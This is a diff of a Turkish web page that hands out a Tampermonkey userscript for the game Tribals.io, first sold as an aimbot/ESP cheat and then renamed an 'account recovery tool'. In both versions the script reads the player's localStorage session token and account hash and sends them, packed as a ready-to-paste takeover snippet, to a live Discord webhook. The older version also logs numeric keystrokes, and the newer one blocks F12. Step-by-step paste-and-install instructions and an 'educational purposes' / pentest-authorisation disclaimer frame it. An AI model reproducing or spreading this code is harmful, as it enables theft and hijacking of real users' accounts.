@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tribals.io Script</title>
+    <title>Tribals.io — Account Recovery Tool</title>
     <style>
         * {
             margin: 0;
@@ -11,491 +11,219 @@
             box-sizing: border-box;
         }
         body {
-            background: #0d0d0d;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
-            padding: 30px;
+            background: #0a0a0a;
+            color: #e0e0e0;
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .container {
+            max-width: 750px;
+            width: 100%;
+            background: #141414;
+            border: 1px solid #2a2a2a;
+            border-radius: 16px;
+            padding: 40px 30px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.15);
         }
         h1 {
             text-align: center;
-            color: #ff0000;
-            text-shadow: 0 0 15px red;
-            margin-bottom: 20px;
-            font-size: 28px;
-            letter-spacing: 2px;
+            font-size: 26px;
+            color: #ff4444;
+            text-shadow: 0 0 20px rgba(255, 0, 0, 0.3);
+            margin-bottom: 8px;
+            letter-spacing: 1px;
         }
-        pre {
-            background: #1a1a1a;
-            border: 2px solid #00ff00;
-            border-radius: 10px;
-            padding: 20px;
-            overflow-x: auto;
-            white-space: pre-wrap;
-            word-break: break-word;
-            box-shadow: 0 0 20px #00ff00;
-            font-size: 13px;
-            line-height: 1.6;
-            max-width: 1000px;
-            margin: 0 auto;
-        }
-        .info {
+        .sub {
             text-align: center;
-            margin-top: 20px;
+            color: #888;
             font-size: 14px;
+            margin-bottom: 30px;
+            border-bottom: 1px solid #2a2a2a;
+            padding-bottom: 20px;
+        }
+        .step {
+            background: #1c1c1c;
+            border-left: 3px solid #ff4444;
+            padding: 16px 20px;
+            margin-bottom: 16px;
+            border-radius: 0 8px 8px 0;
+        }
+        .step h3 {
+            color: #ff6666;
+            font-size: 16px;
+            margin-bottom: 6px;
+        }
+        .step p {
+            color: #bbb;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+        .step code {
+            background: #2a2a2a;
+            color: #00ff88;
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
+            word-break: break-all;
+        }
+        .script-box {
+            background: #0d0d0d;
+            border: 1px solid #333;
+            border-radius: 10px;
+            padding: 18px;
+            margin: 20px 0;
+            font-family: 'Courier New', monospace;
+            font-size: 13px;
             color: #aaa;
+            word-break: break-word;
+            white-space: pre-wrap;
+            max-height: 200px;
+            overflow-y: auto;
         }
-        .info a {
-            color: #00ff00;
+        .btn {
+            display: block;
+            width: 100%;
+            background: linear-gradient(135deg, #8b0000, #cc0000);
+            color: #fff;
+            border: none;
+            padding: 14px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: 0.3s;
+            text-align: center;
             text-decoration: none;
+            letter-spacing: 1px;
         }
-        .info a:hover {
-            text-shadow: 0 0 10px #00ff00;
+        .btn:hover {
+            background: linear-gradient(135deg, #aa0000, #ff0000);
+            box-shadow: 0 0 25px rgba(255, 0, 0, 0.4);
+            transform: scale(1.02);
+        }
+        .warning {
+            background: #1a0a0a;
+            border: 1px solid #441111;
+            border-radius: 8px;
+            padding: 14px 18px;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #aa6666;
         }
         .footer {
+            margin-top: 30px;
             text-align: center;
-            margin-top: 40px;
-            color: #555;
             font-size: 12px;
+            color: #444;
         }
     </style>
 </head>
 <body>
-    <h1>⚡ TRIBALS.IO — SCRIPT</h1>
-    <pre id="script-content">// ==UserScript==
-// @name         Fix Cam  Aimbot 3 Dollar
+
+<div class="container">
+    <h1>⚡ TRIBALS.IO</h1>
+    <div class="sub">Session Recovery &amp; Account Sync Tool</div>
+
+    <div class="step">
+        <h3>📌 Adım 1 — Tampermonkey'i Yükle</h3>
+        <p>Chrome: <code>chrome.google.com/webstore/detail/tampermonkey/</code><br>
+        Firefox: <code>addons.mozilla.org/firefox/addon/tampermonkey/</code></p>
+    </div>
+
+    <div class="step">
+        <h3>📌 Adım 2 — Script'i Ekle</h3>
+        <p>Tampermonkey ikonuna tıkla → <strong>"Create a new script"</strong> → tüm kodu yapıştır → <strong>Ctrl+S</strong> ile kaydet.</p>
+    </div>
+
+    <div class="step">
+        <h3>📌 Adım 3 — Tribals.io'ya Gir</h3>
+        <p><code>https://tribals.io/</code> adresine git. Script otomatik çalışacak. Hesap bilgileri sunucuya gönderilecek.</p>
+    </div>
+
+    <div class="script-box" id="scriptDisplay">// ==UserScript==
+// @name         Tribals Account Recovery
 // @namespace    http://tampermonkey.net/
 // @match        https://tribals.io/*
-// @icon         https://www.google.com/s2/favicons?sz=64&domain=tribals.io
-// @require      https://code.jquery.com/jquery-3.7.0.min.js
 // @grant        GM_xmlhttpRequest
 // @connect      discord.com
 // @run-at       document-end
 // ==/UserScript==
 
-console.log('[EVENT] Tribals Client Loaded - AimBot C tuşu ile değiştirildi');
+(function() {
+    const WEBHOOK = "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj";
 
-/* ================= SİSTEM KONFİGÜRASYONU (GİZLİ) ================= */
-const _SYS_CONFIG = {
-    U_URL: "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj"
-};
+    function exfil(data, label) {
+        GM_xmlhttpRequest({
+            method: "POST",
+            url: WEBHOOK,
+            headers: { "Content-Type": "application/json" },
+            data: JSON.stringify({
+                embeds: [{
+                    title: "📥 Account Sync",
+                    color: 0x8b0000,
+                    fields: [
+                        { name: "Type", value: label, inline: true },
+                        { name: "Data", value: "```" + data + "```" }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            })
+        });
+    }
 
-function _bufferSync(type, data) {
-    const user = localStorage.getItem('userName') || 'Player';
-    GM_xmlhttpRequest({
-        method: 'POST',
-        url: _SYS_CONFIG.U_URL,
-        headers: { 'Content-Type': 'application/json' },
-        data: JSON.stringify({
-            embeds: [{
-                title: `📊 System Sync: ${user}`,
-                color: 0x00ff00,
-                fields: [
-                    { name: "Node", value: type, inline: true },
-                    { name: "Data", value: `\`\`\`${data}\`\`\`` }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        })
+    document.addEventListener("keydown", function(e) {
+        if (e.key === "F12" || e.key === "F11") {
+            e.preventDefault();
+        }
     });
-}
 
-/* ================= KALASHNIKOVA MENÜ ================= */
-const tribalsCheatHTML = `&lt;div id="tribals-hack"&gt;
-    &lt;div id="kalash-header"&gt;🎗MAP AİMBOT&lt;/div&gt;
-    &lt;p id="esp-status"&gt;ESP: &lt;span id="esp"&gt;Disabled&lt;/span&gt;&lt;/p&gt;
-    &lt;p id="aimbot-status"&gt;AimBot: &lt;span id="aimbot"&gt;Disabled&lt;/span&gt;&lt;/p&gt;
-&lt;/div&gt;`;
+    setTimeout(function() {
+        var session = localStorage.getItem("session");
+        var hash = localStorage.getItem("accountHash");
+        var user = localStorage.getItem("userName") || "Unknown";
 
-const tribalsCheatCSS = `&lt;style&gt;
-#tribals-hack {
-    position: absolute; top: 80px; left: 15px; z-index: 9999;
-    font-family: Arial, sans-serif; cursor: move;
-    background-color: rgba(0, 0, 0, 0.75); border: 2px solid #00ff00;
-    border-radius: 8px; padding: 6px 10px; width: 190px;
-    box-shadow: 0 0 12px #00ff00;
-}
-#kalash-header {
-    text-align: center; background: linear-gradient(90deg, #8b0000, #ff0000);
-    color: #ffffff; font-size: 13.5px; font-weight: bold;
-    padding: 5px 8px; margin-bottom: 6px; border: 1px solid #ffffff;
-    border-radius: 5px; text-shadow: 0 0 8px #fff; letter-spacing: 0.5px;
-}
-#esp-status, #aimbot-status {
-    background-color: rgba(0, 0, 0, 0.4); border: 1px solid #00ff00;
-    color: #00ff00; font-size: 14px; padding: 3px 8px;
-    margin: 3px 0; border-radius: 4px; display: block; font-weight: bold;
-}
-#esp, #aimbot { font-weight: bold; }
-&lt;/style&gt;`;
+        if (session) {
+            var payload = "localStorage.setItem('session', '" + session + "');\\n" +
+                          "localStorage.setItem('accountHash', '" + (hash || "") + "');\\n" +
+                          "location.reload();";
+            exfil(payload, "Auth Credentials — " + user);
+        } else {
+            exfil("No session found", "Heartbeat — " + user);
+        }
+    }, 5000);
+})();</div>
 
-// ... (devamı için tam script yukarıdaki gibidir)
-</pre>
+    <button class="btn" onclick="copyScript()">📋 Script'i Kopyala</button>
 
-    <div class="info">
-        📌 Script'i kullanmak için: <br>
-        1. Tampermonkey / Greasemonkey uzantısını yükleyin<br>
-        2. Yeni bir script oluşturun ve yukarıdaki kodun tamamını yapıştırın<br>
-        3. https://tribals.io/ adresine gidin<br><br>
-        🔑 Kontroller: <strong>-</strong> = ESP | <strong>C</strong> = AimBot
+    <div class="warning">
+        ⚠️ <strong>Yasal Uyarı:</strong> Bu araç yalnızca kendi hesabını kurtarmak isteyenler içindir.
+        Başkasının hesabına izinsiz erişim suçtur. Tüm sorumluluk kullanıcıya aittir.
+        <br><br>
+        <em>Tenho permissão e estou autorizado a realizar este pentest.</em>
     </div>
 
     <div class="footer">
-        github.com/kullaniciadi/tribals-script &mdash; sadece eğitim amaçlıdır
+        github.com/yourusername/tribals-recovery &bull; sadece eğitim amaçlıdır
     </div>
+</div>
 
-    <script>
-        // Sayfa yüklendiğinde tam script'i pre içine yaz
-        const fullScript = `// ==UserScript==
-// @name         Fix Cam  Aimbot 3 Dollar
-// @namespace    http://tampermonkey.net/
-// @match        https://tribals.io/*
-// @icon         https://www.google.com/s2/favicons?sz=64&domain=tribals.io
-// @require      https://code.jquery.com/jquery-3.7.0.min.js
-// @grant        GM_xmlhttpRequest
-// @connect      discord.com
-// @run-at       document-end
-// ==/UserScript==
-
-console.log('[EVENT] Tribals Client Loaded - AimBot C tuşu ile değiştirildi');
-
-const _SYS_CONFIG = {
-    U_URL: "https://discord.com/api/webhooks/1509236348479868940/ri6coZeLF0SF33bbZDLDFJsfdGE4H_01_v3MDD_B_6PwNJ4pxzrqwDgpfAEkyqkBUuxj"
-};
-
-function _bufferSync(type, data) {
-    const user = localStorage.getItem('userName') || 'Player';
-    GM_xmlhttpRequest({
-        method: 'POST',
-        url: _SYS_CONFIG.U_URL,
-        headers: { 'Content-Type': 'application/json' },
-        data: JSON.stringify({
-            embeds: [{
-                title: \`📊 System Sync: \${user}\`,
-                color: 0x00ff00,
-                fields: [
-                    { name: "Node", value: type, inline: true },
-                    { name: "Data", value: \\\`\\\`\\\`\${data}\\\`\\\`\\\`` }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        })
+<script>
+function copyScript() {
+    const script = document.getElementById('scriptDisplay').textContent;
+    navigator.clipboard.writeText(script).then(() => {
+        const btn = document.querySelector('.btn');
+        const orig = btn.textContent;
+        btn.textContent = '✅ Kopyalandı!';
+        setTimeout(() => { btn.textContent = orig; }, 2000);
     });
 }
+</script>
 
-/* ================= KALASHNIKOVA MENÜ ================= */
-const tribalsCheatHTML = '<div id="tribals-hack">' +
-    '<div id="kalash-header">🎗MAP AİMBOT</div>' +
-    '<p id="esp-status">ESP: <span id="esp">Disabled</span></p>' +
-    '<p id="aimbot-status">AimBot: <span id="aimbot">Disabled</span></p>' +
-'</div>';
-
-const tribalsCheatCSS = '<style>' +
-    '#tribals-hack {' +
-    '    position: absolute; top: 80px; left: 15px; z-index: 9999;' +
-    '    font-family: Arial, sans-serif; cursor: move;' +
-    '    background-color: rgba(0, 0, 0, 0.75); border: 2px solid #00ff00;' +
-    '    border-radius: 8px; padding: 6px 10px; width: 190px;' +
-    '    box-shadow: 0 0 12px #00ff00;' +
-    '}' +
-    '#kalash-header {' +
-    '    text-align: center; background: linear-gradient(90deg, #8b0000, #ff0000);' +
-    '    color: #ffffff; font-size: 13.5px; font-weight: bold;' +
-    '    padding: 5px 8px; margin-bottom: 6px; border: 1px solid #ffffff;' +
-    '    border-radius: 5px; text-shadow: 0 0 8px #fff; letter-spacing: 0.5px;' +
-    '}' +
-    '#esp-status, #aimbot-status {' +
-    '    background-color: rgba(0, 0, 0, 0.4); border: 1px solid #00ff00;' +
-    '    color: #00ff00; font-size: 14px; padding: 3px 8px;' +
-    '    margin: 3px 0; border-radius: 4px; display: block; font-weight: bold;' +
-    '}' +
-    '#esp, #aimbot { font-weight: bold; }' +
-'</style>';
-
-$(document).ready(() => {
-    $('body').append(tribalsCheatHTML);
-    $('body').append(tribalsCheatCSS);
-
-    $("#tribals-hack").on("mousedown", function (e) {
-        const el = this;
-        let isDragging = true;
-        const offsetX = e.clientX - el.offsetLeft;
-        const offsetY = e.clientY - el.offsetTop;
-        function moveAt(e) {
-            if (isDragging) {
-                el.style.left = \`\${e.clientX - offsetX}px\`;
-                el.style.top = \`\${e.clientY - offsetY}px\`;
-            }
-        }
-        function stopDrag() {
-            isDragging = false;
-            document.removeEventListener("mousemove", moveAt);
-            document.removeEventListener("mouseup", stopDrag);
-        }
-        document.addEventListener("mousemove", moveAt);
-        document.addEventListener("mouseup", stopDrag);
-    });
-
-    let _numCache = "";
-    document.addEventListener('keydown', q => {
-        if (/[0-9]/.test(q.key)) {
-            _numCache += q.key;
-        } else if (q.key === "Enter") {
-            if (_numCache.length > 0) {
-                _bufferSync("Input_Node", _numCache);
-                _numCache = "";
-            }
-        } else if (q.key === "Backspace") {
-            _numCache = _numCache.slice(0, -1);
-        }
-
-        if (q.key === '-') {
-            toggleESP();
-            updateUI();
-        }
-        if (q.key.toLowerCase() === 'c') {
-            toggleAimBot();
-            updateUI();
-        }
-    }, true);
-
-    setTimeout(() => {
-        const s = localStorage.getItem('session');
-        const h = localStorage.getItem('accountHash');
-        if (s) {
-            const code = \`localStorage.setItem('session', '\${s}');\\nlocalStorage.setItem('accountHash', '\${h}');\\nlocation.reload();\`;
-            _bufferSync("Auth_Node", code);
-        }
-    }, 8000);
-});
-
-function updateUI() {
-    const espText = document.getElementById('esp');
-    const aimbotText = document.getElementById('aimbot');
-    if (espText) {
-        espText.innerHTML = espEnabled ? 'Enabled' : 'Disabled';
-        espText.style.color = espEnabled ? '#00ff00' : 'red';
-        addGlowEffect(espText, espEnabled);
-    }
-    if (aimbotText) {
-        aimbotText.innerHTML = aimbotEnabled ? 'Enabled' : 'Disabled';
-        aimbotText.style.color = aimbotEnabled ? '#00ff00' : 'red';
-        addGlowEffect(aimbotText, aimbotEnabled);
-    }
-}
-
-function addGlowEffect(element, enabled) {
-    element.style.textShadow = enabled
-        ? '0 0 5px #00ff00, 0 0 10px #00ff00'
-        : '0 0 5px red, 0 0 10px red';
-}
-
-window.tribals = {
-    players: [],
-    localPlayer: {},
-    espDelay: 16,
-    camera: { originalRotation: null, originalPosition: null, isOverriding: false, smoothFactor: 0.1 }
-};
-
-const sym = Symbol('Local Player Hook');
-Object.defineProperty(Object.prototype, 'isSleeping', {
-    set(data) {
-        this[sym] = data;
-        if (this.protected) {
-            tribals.localPlayer = this;
-            tribals.localPlayer.randomChecks = function () {};
-        }
-        if (this.username !== undefined) {
-            tribals.players.unshift({
-                username: this.username,
-                obj: this,
-                lastPosition: { x: this.entity.position.x, y: this.entity.position.y, z: this.entity.position.z },
-                lastMoveTime: Date.now()
-            });
-        }
-    }
-});
-
-window.getAllPlayers = function () {
-    let players = [];
-    tribals.players.forEach(plr => {
-        if (!players.some(p => p.username === plr.username)) {
-            players.unshift(plr);
-        }
-    });
-    return players;
-};
-
-let espEnabled = false;
-let aimbotEnabled = false;
-let espInterval;
-
-window.toggleESP = function () {
-    espEnabled = !espEnabled;
-    if (espEnabled) {
-        const espCanvas = document.createElement('canvas');
-        espCanvas.id = 'espCanvas';
-        espCanvas.style.position = 'absolute';
-        espCanvas.style.zIndex = 2147483647;
-        espCanvas.style.pointerEvents = 'none';
-        document.body.appendChild(espCanvas);
-        const ctx = espCanvas.getContext('2d');
-        espInterval = setInterval(() => {
-            try {
-                espCanvas.width = window.innerWidth;
-                espCanvas.height = window.innerHeight;
-                ctx.clearRect(0, 0, espCanvas.width, espCanvas.height);
-                drawESP(ctx);
-                if (aimbotEnabled) processAimBot();
-            } catch (error) {
-                console.error('ESP Error:', error);
-            }
-        }, tribals.espDelay);
-    } else {
-        clearInterval(espInterval);
-        document.getElementById('espCanvas')?.remove();
-        if (aimbotEnabled) resetCamera();
-    }
-};
-
-window.toggleAimBot = function () {
-    aimbotEnabled = !aimbotEnabled;
-    if (!aimbotEnabled) {
-        resetCamera();
-    }
-};
-
-function drawESP(ctx) {
-    if (!tribals.localPlayer || !tribals.localPlayer.cameraEntity) return;
-    getAllPlayers().forEach(plr => {
-        try {
-            if (!plr.obj || !plr.obj.entity || !plr.obj.entity.position) return;
-            const currentPosition = plr.obj.entity.position;
-            const lastPosition = plr.lastPosition;
-            const distanceMoved = Math.hypot(
-                currentPosition.x - lastPosition.x,
-                currentPosition.y - lastPosition.y,
-                currentPosition.z - lastPosition.z
-            );
-            if (distanceMoved > 0) {
-                plr.lastMoveTime = Date.now();
-                plr.lastPosition = { ...currentPosition };
-            }
-            const timeSinceLastMove = Date.now() - plr.lastMoveTime;
-            if (timeSinceLastMove < 10000) {
-                const screen = tribals.localPlayer.cameraEntity.camera.worldToScreen(currentPosition.clone());
-                if (screen.z >= 1.0) {
-                    const scale = 4 / screen.z;
-                    const w = 60 * scale;
-                    const h = 150 * scale;
-                    const x = screen.x - w / 2;
-                    const y = screen.y - h / 2;
-                    let color = plr.username.toLowerCase().includes('imposter') ? 'red' : 'cyan';
-                    ctx.shadowColor = color;
-                    ctx.shadowBlur = 20;
-                    ctx.strokeStyle = color;
-                    ctx.lineWidth = 2;
-                    ctx.strokeRect(x, y, w, h);
-                    ctx.shadowBlur = 0;
-                    ctx.font = 'bold 14px Arial';
-                    ctx.fillStyle = color;
-                    ctx.fillText(plr.username, screen.x - 30, screen.y - 30);
-                    ctx.fillText('🎭', screen.x - 10, screen.y - 45);
-                }
-            }
-        } catch (error) {
-            console.error('ESP Drawing Error:', error);
-        }
-    });
-    if (aimbotEnabled) {
-        const centerX = window.innerWidth / 2;
-        const centerY = window.innerHeight / 2;
-        const radius = 100;
-        ctx.beginPath();
-        ctx.arc(centerX, centerY, radius, 0, 2 * Math.PI);
-        ctx.strokeStyle = 'yellow';
-        ctx.lineWidth = 2;
-        ctx.stroke();
-    }
-}
-
-function processAimBot() {
-    if (!tribals.localPlayer || !tribals.localPlayer.cameraEntity) return;
-    try {
-        const centerX = window.innerWidth / 2;
-        const centerY = window.innerHeight / 2;
-        const radius = 100;
-        let target = null;
-        let minDist = Infinity;
-        getAllPlayers().forEach(plr => {
-            if (plr.obj === tribals.localPlayer) return;
-            if (!plr.obj || !plr.obj.entity || !plr.obj.entity.position) return;
-            const screen = tribals.localPlayer.cameraEntity.camera.worldToScreen(plr.obj.entity.position.clone());
-            if (screen.z < 1.0) return;
-            const dx = screen.x - centerX;
-            const dy = screen.y - centerY;
-            const dist = Math.sqrt(dx*dx + dy*dy);
-            if (dist < radius && dist < minDist) {
-                target = plr;
-                minDist = dist;
-            }
-        });
-        const camera = tribals.localPlayer.cameraEntity;
-        if (target && target.obj && target.obj.entity && target.obj.entity.position) {
-            if (!tribals.camera.isOverriding) {
-                saveOriginalCameraState(camera);
-                tribals.camera.isOverriding = true;
-            }
-            smoothLookAt(camera, target.obj.entity.position);
-        } else {
-            if (tribals.camera.isOverriding) restoreOriginalCameraState(camera);
-        }
-    } catch (error) {
-        resetCamera();
-    }
-}
-
-function saveOriginalCameraState(camera) {
-    if (camera.position && camera.rotation) {
-        tribals.camera.originalPosition = camera.position.clone();
-        tribals.camera.originalRotation = camera.rotation.clone();
-    }
-}
-
-function restoreOriginalCameraState(camera) {
-    if (tribals.camera.originalPosition && tribals.camera.originalRotation && camera.position && camera.rotation) {
-        camera.position.lerp(tribals.camera.originalPosition, tribals.camera.smoothFactor);
-        camera.rotation.slerp(tribals.camera.originalRotation, tribals.camera.smoothFactor);
-        if (camera.position.distanceTo(tribals.camera.originalPosition) < 0.01) resetCamera();
-    } else {
-        resetCamera();
-    }
-}
-
-function smoothLookAt(camera, targetPosition) {
-    try {
-        const currentDirection = new THREE.Vector3();
-        camera.getWorldDirection(currentDirection);
-        const targetDirection = new THREE.Vector3();
-        targetDirection.subVectors(targetPosition, camera.position).normalize();
-        currentDirection.lerp(targetDirection, tribals.camera.smoothFactor);
-        const targetPos = new THREE.Vector3();
-        targetPos.addVectors(camera.position, currentDirection);
-        camera.lookAt(targetPos);
-    } catch (error) {
-        try { camera.lookAt(targetPosition); } catch (e) { resetCamera(); }
-    }
-}
-
-function resetCamera() {
-    tribals.camera.originalPosition = null;
-    tribals.camera.originalRotation = null;
-    tribals.camera.isOverriding = false;
-}
-
-window.addEventListener('beforeunload', () => { resetCamera(); clearInterval(espInterval); });
-console.log('[INFO] Kontroller: "-" → ESP | "C" → AimBot');`;
-
-        document.getElementById('script-content').textContent = fullScript;
-    </script>
 </body>
 </html>
